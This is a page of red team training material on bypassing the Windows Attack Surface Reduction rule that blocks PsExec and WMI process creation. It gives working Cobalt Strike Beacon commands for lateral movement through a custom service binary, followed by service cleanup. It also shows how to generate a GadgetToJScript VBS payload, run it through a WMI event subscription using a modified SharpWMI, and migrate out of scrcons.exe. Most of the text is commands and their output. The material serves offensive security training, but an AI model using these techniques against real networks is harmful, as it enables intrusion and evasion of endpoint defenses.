_"This rule blocks processes created through PsExec and WMI from running."_

PsExec from the Sysinternals Suite and WMI Process Call Create are two popular methods for lateral movement (PsExec also a useful way to get SYSTEM access from a local admin).  `RTO2\cbridges` is a local admin on WKSTN-2, so from WKSTN-1 we can try and execute commands remotely to demonstrate the restrictions.

  

## PsExec

Attempting to execute a binary via PsExec on the remote target fails.

```
C:\Users\cbridges>C:\Sysinternals\PsExec64.exe \\wkstn-2 cmd.exe

PsExec v2.32 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

PsExec could not start cmd.exe on wkstn-2:
The system cannot find the file specified.
```

  

On WKSTN-2, the following alert is raised:

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/asr/psexec-blocked.png)

  

It appears this rule is specific to the Sysinternals PsExec implementation - it does not prevent you from creating and starting arbitrary services, which makes this trivial to bypass.  Simply drop your own service binary to disk and create a service to run it.

```
beacon> cd \\wkstn-2\admin$
beacon> upload /root/beacon-svc.exe
beacon> run sc \\wkstn-2 create RandoService binPath= C:\Windows\beacon-svc.exe

[SC] CreateService SUCCESS

beacon> run sc \\wkstn-2 start RandoService

SERVICE_NAME: RandoService 
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2056
        FLAGS              : 

beacon> link wkstn-2
[+] established link to child beacon: 10.10.120.75

beacon> rm beacon-svc.exe
beacon> run sc \\wkstn-2 delete RandoService

[SC] DeleteService SUCCESS
```

This also means the automated jump command works.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/asr/jump-psexec64.png)


## WMI

As with PsExec, attempting to execute a binary via `wmic /node` or Cobalt Strike's `remote-exec wmi` command is blocked.

```
beacon> run wmic /node:"wkstn-2" process call create "C:\Windows\System32\win32calc.exe"

Executing (Win32_Process)->Create()

Method execution successful.

Out Parameters:
instance of __PARAMETERS
{
	ReturnValue = 2;
};
```
  

The rule effectively prevents WmiPrvSE.exe from spawning children.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/asr/wmiprvse-blocked.png)

  

The way to get around this one is to use VBScript payloads via an event subscription.

This requires a number of steps:

-   Generate a payload
-   Connect to WMI
-   Create an event filter to trigger the execution (via a timer)
-   Create an [ActiveScriptEventConsumer](https://docs.microsoft.com/en-us/windows/win32/wmisdk/activescripteventconsumer), using the VBScript engine
-   Create a FilterToConsumerBinding to link the filter and consumer
-   Wait for execution
-   Delete all of the above

Luckily, [SharpWMI](https://github.com/GhostPack/SharpWMI) already has this capability built-in.  For the payload, we can use one of our C# process injection projects and GadgetToJScript with the **-w vbs** option to write this out to a .vbs file.

```powershell
C:\Tools\GadgetToJScript>GadgetToJScript\bin\Debug\GadgetToJScript.exe -a TestAssembly\bin\Debug\TestAssembly.dll -w vbs -o C:\Users\Administrator\Desktop\wmi -b
[+]: Generating the vbs payload
[+]: First stage gadget generation done.
[+]: Loading your .NET assembly:TestAssembly\bin\Debug\TestAssembly.dll
[+]: Second stage gadget generation done.
[*]: Payload generation completed, check: C:\Users\Administrator\Desktop\wmi.vbs
```

  

There are some gotcha's from here.  SharpWMI's `script=` parameter expects to read the VBS file off disk of the machine running Beacon (not from your host), or it takes the input as raw VBS.  The `scriptb64=` parameter takes the VBS as a single base64 encoded string, but the G2JS gadget is too large to fit on the CS command line.  A solution to this, though far from ideal, is to hardcode the gadget directly into the SharpWMI assembly.

At the top of **Program.cs** you will see several **private static string** fields.  Create a new called HardcodedGadget (or something similar) and copy/paste the G2JS VBS here.

```
private static string HardcodedGadget = @"<PUT YOUR VBS HERE>";
```

  

Within this file, there's also a method called **GetVBSPayload**, which returns a string.  It usually returns a VBS payload based on your script= or scriptb64= input.  But I'm going to force this method to always return the hardcoded gadget by doing something like this:

```
static string GetVBSPayload(Dictionary<string, string> arguments)
{
    return HardcodedGadget;
}
```

  

Then just re-compile the assembly and execute it.

```shell
beacon> execute-assembly /root/tools/SharpWMI2.exe action=executevbs computername=wkstn-2 script=blah

[*] Using direct script's parameter as VBScript payload.
[*] Script will trigger after 10 and we'll wait for 12 seconds.

[*] Creating Event Subscription Debug : wkstn-2 - with interval between events: 10 secs
[*] Setting 'Debug' event filter on wkstn-2
[*] Setting 'Debug' event consumer on wkstn-2 to kill script after 12 secs
[*] Binding 'Debug' event filter and consumer on wkstn-2

[*] Waiting 10 seconds for event to trigger on wkstn-2 ...

[*] Removing 'Timer' internal timer from wkstn-2
[*] Removing FilterToConsumerBinding from wkstn-2
[*] Removing 'Debug' event filter from wkstn-2
[*] Removing 'Debug' event consumer from wkstn-2
```

The VBS is executed by scrcons.exe (WMI Standard Event Consumer), so if your injector performs "self-injection" (e.g. `var target = Process.GetCurrentProcess();`), the Beacon will be running inside this process.


![](https://rto2-assets.s3.eu-west-2.amazonaws.com/asr/wmi-vbs-beacon.png)


>  scrcons.exe will exit shortly after execution, so you have to migrate out of this process ASAP (e.g. with inject, shinject, shspawn etc).

